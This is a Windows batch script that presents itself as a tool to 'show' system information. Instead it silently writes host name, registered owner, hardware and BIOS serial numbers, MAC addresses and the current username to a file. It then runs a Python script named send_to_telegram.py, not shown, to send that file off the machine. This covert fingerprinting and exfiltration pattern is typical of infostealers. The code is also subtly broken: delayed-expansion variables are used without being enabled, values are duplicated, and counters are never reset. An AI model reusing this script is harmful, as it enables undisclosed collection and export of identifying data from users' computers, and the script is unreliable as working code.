@ECHO OFF
TITLE System Information Batch File
ECHO This batch file will show Windows 10 Operating System information and additional details.

:: Redirect all output to system_info.txt
(
    ECHO --- Operating System Information ---
    FOR /F "tokens=*" %%A IN ('systeminfo ^| findstr /C:"Host Name"') DO ECHO %%A
    FOR /F "tokens=*" %%A IN ('systeminfo ^| findstr /C:"OS Name"') DO ECHO %%A
    FOR /F "tokens=*" %%A IN ('systeminfo ^| findstr /C:"OS Version"') DO ECHO %%A
    FOR /F "tokens=*" %%A IN ('systeminfo ^| findstr /C:"System Type"') DO ECHO %%A
    FOR /F "tokens=*" %%A IN ('systeminfo ^| findstr /C:"Registered Owner"') DO ECHO %%A

    ECHO --- Memory Information ---
    FOR /F "tokens=2 delims==" %%A IN ('wmic MEMORYCHIP get BankLabel /format:list') DO SET /A "count+=1" & SET "line_!count!=Bank Label: %%A"
    FOR /F "tokens=2 delims==" %%A IN ('wmic MEMORYCHIP get Capacity /format:list') DO SET /A "count+=1" & SET "line_!count!=%%A Capacity: %%A"
    FOR /F "tokens=2 delims==" %%A IN ('wmic MEMORYCHIP get MemoryType /format:list') DO SET /A "count+=1" & SET "line_!count!=%%A Memory Type: %%A"
    FOR /F "tokens=2 delims==" %%A IN ('wmic MEMORYCHIP get Speed /format:list') DO SET /A "count+=1" & SET "line_!count!=%%A Speed: %%A"
    FOR /L %%i IN (1,1,!count!) DO ECHO !line_%%i!

    ECHO --- System Serial Number ---
    FOR /F "tokens=2 delims==" %%A IN ('wmic bios get serialnumber /format:list') DO ECHO Serial Number: %%A

    ECHO --- CPU Information ---
    FOR /F "tokens=2 delims==" %%A IN ('wmic cpu get MaxClockSpeed /format:list') DO ECHO Max Clock Speed: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic cpu get Name /format:list') DO ECHO Name: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic cpu get NumberOfCores /format:list') DO ECHO Number of Cores: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic cpu get NumberOfLogicalProcessors /format:list') DO ECHO Number of Logical Processors: %%A

    ECHO --- GPU Information ---
    FOR /F "tokens=2 delims==" %%A IN ('wmic path win32_videocontroller get Name /format:list') DO SET /A "count+=1" & SET "line_!count!=Name: %%A"
    FOR /F "tokens=2 delims==" %%A IN ('wmic path win32_videocontroller get DriverVersion /format:list') DO SET /A "count+=1" & SET "line_!count!=%%A Driver Version: %%A"
    FOR /L %%i IN (1,1,!count!) DO ECHO !line_%%i!

    ECHO --- Disk Drive Information ---
    FOR /F "tokens=2 delims==" %%A IN ('wmic diskdrive get Model /format:list') DO ECHO Model: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic diskdrive get Size /format:list') DO ECHO Size: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic diskdrive get Caption /format:list') DO ECHO Caption: %%A

    ECHO --- Network Adapter Information ---
    FOR /F "tokens=2 delims==" %%A IN ('wmic nic where "NetEnabled=true" get Name /format:list') DO SET /A "count+=1" & SET "line_!count!=Name: %%A"
    FOR /F "tokens=2 delims==" %%A IN ('wmic nic where "NetEnabled=true" get MACAddress /format:list') DO SET /A "count+=1" & SET "line_!count!=%%A MAC Address: %%A"
    FOR /L %%i IN (1,1,!count!) DO ECHO !line_%%i!

    ECHO --- Battery Information ---
    FOR /F "tokens=2 delims==" %%A IN ('wmic path Win32_Battery get Name /format:list') DO ECHO Name: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic path Win32_Battery get EstimatedChargeRemaining /format:list') DO ECHO Estimated Charge Remaining: %%A

    ECHO --- Logical Disk Information ---
    FOR /F "tokens=2 delims==" %%A IN ('wmic logicaldisk get Description /format:list') DO ECHO Description: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic logicaldisk get FileSystem /format:list') DO ECHO File System: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic logicaldisk get FreeSpace /format:list') DO ECHO Free Space: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic logicaldisk get Name /format:list') DO ECHO Name: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic logicaldisk get Size /format:list') DO ECHO Size: %%A

    ECHO --- Motherboard Information ---
    FOR /F "tokens=2 delims==" %%A IN ('wmic baseboard get Product /format:list') DO ECHO Product: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic baseboard get Manufacturer /format:list') DO ECHO Manufacturer: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic baseboard get Version /format:list') DO ECHO Version: %%A
    FOR /F "tokens=2 delims==" %%A IN ('wmic baseboard get SerialNumber /format:list') DO ECHO Serial Number: %%A

    ECHO --- Organizational Unit of Current User ---
    FOR /F "tokens=2 delims==" %%i IN ('"wmic computersystem get username /value"') DO SET "username=%%i"
    ECHO %username%
) > system_info.txt

:: Run the Python script to send the information to Telegram
python send_to_telegram.py

PAUSE
